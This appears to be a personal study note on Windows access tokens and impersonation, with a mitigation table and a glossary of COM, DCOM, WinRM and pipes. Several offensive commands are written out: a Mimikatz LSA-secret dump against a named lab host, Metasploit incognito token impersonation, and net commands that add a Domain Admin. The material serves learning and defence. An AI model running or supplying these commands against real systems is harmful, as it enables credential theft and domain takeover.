Access tokens are security objects in Windows that represent the identity and permissions of a user or process. They are crucial for authentication and authorization. They are created by the Local Security Authority (LSA) when a user login to a system whether it is locally, over the network, as a service, or even directly calling an API function. 

## How It Works?  
- **Creation**: Tokens are generated when a user logs in or a process starts.  It contains ID of the logon session, User and group SIDs, integrity level and privileges held by the user or groups the user is in.  
- **Use**: Tokens are used to authenticate and authorize access to resources. A process can use an impersonation token to act on behalf of another user.  
- **Impersonation**: A process can temporarily adopt the security context of another user, allowing it to perform actions with the impersonated user's privileges.
 
 Types of Tokens  
- **Primary Token**: Represents the security context of a process.  
- **Impersonation Token**: Allows a process to assume the identity and privileges of another user or process.  
- **Delegation Token**: Used in scenarios where a service needs to perform actions on behalf of a user, often involving Kerberos delegation.

To check privileges
```
whoami /priv
```

Invokes `mimikatz` through `powershell` to dump LSA secrets
```
Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer HYDRA.marvel.local
```

[[Gaining Shell Access]] with metasploit
![[Gaining Shell Access#^6e325c]]
Load incognito
```
1. load incognito
2. list_tokens -u
3. impersonate_token <DOMAIN>\\<USERNAME>

```
Add new user as Domain Admin
```
1. net user /add <USERNAME> <PASSWORD>@ /domain
2. net group "Domain admins" <USERNAME> /ADD /DOMAIN

```

## Mitigation

| **Methods**                         | **Description**                                                                                                                                 |
| ----------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| **Secure Token Storage**            | Protect tokens from unauthorized access and ensure secure handling and storage of tokens.                                                       |
| **Least Privilege**                 | Apply the principle of least privilege to limit the permissions of user accounts and processes to reduce the impact of potential impersonation. |
| **Access Control Policies**         | Enforce strict access control policies and regularly review user and process permissions.                                                       |
| **Limit User/Group Token Creation** | Restrict who can create or manage tokens to trusted administrators or processes.                                                                |
| **Account Tiering**                 | Separate accounts into different security tiers to limit damage from compromised lower-tier accounts.                                           |
| **Local Admin Restriction**         | Restrict local administrative privileges to reduce the risk of token manipulation and unauthorized actions.                                     |

## Terminologies
- Component Object Model (COM): A system that creates binary software components that can interact
- DCOM (Distributed Component Object Model) allows software components to communicate over networked computers.
- `OXID` Resolver: A service (Part of `RPCSS` service) that runs on every machine and supports COM. It allows a client to resolve a COM server object and bind to it for methods invocations. (Typically authenticated using NTLM)
Note: *Starting from Windows 10 1809 & Windows Server 2019, its **no more possible** to query the OXID resolver on a port different than 135*
- IMarshal interface: Enables a COM object to define and manage the marshaling of its interface pointers.
- Marshaling: The process of packaging data into packets for transmission to a different process or computer
- Unmarshaling: The process of recovering that data at the receiving end.
- `CLSID`: a unique global identifier that identifies a COM class object, like Universally unique identifier (UUID).
- Background Intelligent Transfer Service (BITS): A Microsoft service that facilitates asynchronous, prioritized and throttled file transfers (Downloading files in the background).
- WinRM is a management protocol used by Windows to handle remote management and automation tasks. It is built on the HTTP protocol, and typically administrators use it to manage systems remotely, for instance, via PowerShell remoting.

Pipes are a method of **Inter-Process Communication (IPC)** on Windows, enabling processes to share data. A **pipe** acts as a shared channel where one process (the **pipe server**) writes data and another (the **pipe client**) reads it. Pipes can be either **anonymous** or **named**.  
- **Anonymous pipes** are used for communication between a **parent and child process**, typically for redirecting input or output. These pipes are simple but can’t be used between unrelated processes.  
- **Named pipes**, on the other hand, allow communication between **unrelated processes**, even across networks, as long as the client has appropriate access permissions. They are a versatile way for independent processes to exchange data.
